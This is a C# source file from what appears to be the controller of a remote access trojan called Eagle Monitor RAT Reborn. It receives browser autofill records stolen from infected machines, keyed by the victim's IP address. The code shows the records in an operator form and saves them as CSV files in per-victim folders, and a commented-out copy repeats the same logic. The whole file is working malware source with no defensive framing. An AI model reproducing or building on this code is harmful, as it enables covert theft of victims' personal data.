using Eagle_Monitor_RAT_Reborn.Network;
using Eagle_Monitor_RAT_Reborn.Misc;
using PacketLib.Packet;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class AutofillPacketHandler
    {
        public AutofillPacketHandler(AutofillPacket autofillPacket): base()//, ClientHandler clientHandler)
        {
            if (autofillPacket.autofillList != null)
            {
                try
                {
                    if (ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView != null)
                    {
                        ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView.BeginInvoke((MethodInvoker)(() =>
                        {
                            ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView.Rows.Clear();
                            foreach (object[] str in autofillPacket.autofillList)
                            {
                                int rowId = ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView.Rows.Add();
                                DataGridViewRow row = ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView.Rows[rowId];
                                row.Cells["Column21"].Value = str[0].ToString();
                                row.Cells["Column22"].Value = str[1].ToString();
                                row.Cells["Column23"].Value = str[2].ToString();
                                row.Cells["Column24"].Value = str[3].ToString();
                                row.Cells["Column25"].Value = str[4].ToString();
                            }
                            if (Program.settings.autoSaveRecovery)
                                Utils.ToCSV(ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientForm.autofillDataGridView, ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv");
                            return;
                        }));
                    }
                    else
                    { Utils.ToCSV(autofillPacket.autofillList, ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
                }
                catch { Utils.ToCSV(autofillPacket.autofillList, ClientHandler.ClientHandlersList[autofillPacket.baseIp].clientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
            }
            else
                return;
            /* new Thread(() =>
             {
                 if (autofillPacket.autofillList != null)
                 {
                     try
                     {
                         if (clientHandler.clientForm.autofillDataGridView != null)
                         {
                             clientHandler.clientForm.autofillDataGridView.BeginInvoke((MethodInvoker)(() =>
                             {
                                 clientHandler.clientForm.autofillDataGridView.Rows.Clear();
                                 foreach (object[] str in autofillPacket.autofillList)
                                 {
                                     int rowId = clientHandler.clientForm.autofillDataGridView.Rows.Add();
                                     DataGridViewRow row = clientHandler.clientForm.autofillDataGridView.Rows[rowId];
                                     row.Cells["Column21"].Value = str[0].ToString();
                                     row.Cells["Column22"].Value = str[1].ToString();
                                     row.Cells["Column23"].Value = str[2].ToString();
                                     row.Cells["Column24"].Value = str[3].ToString();
                                     row.Cells["Column25"].Value = str[4].ToString();
                                 }
                                 if (Program.settings.autoSaveRecovery)
                                     Utils.ToCSV(clientHandler.clientForm.autofillDataGridView, clientHandler.clientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv");
                                 return;
                             }));
                         }
                         else
                         { Utils.ToCSV(autofillPacket.autofillList, clientHandler.clientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
                     }
                     catch { Utils.ToCSV(autofillPacket.autofillList, clientHandler.clientPath + "\\Autofill\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
                 }
                 else
                     return;
             }).Start();*/
        }
    }
}
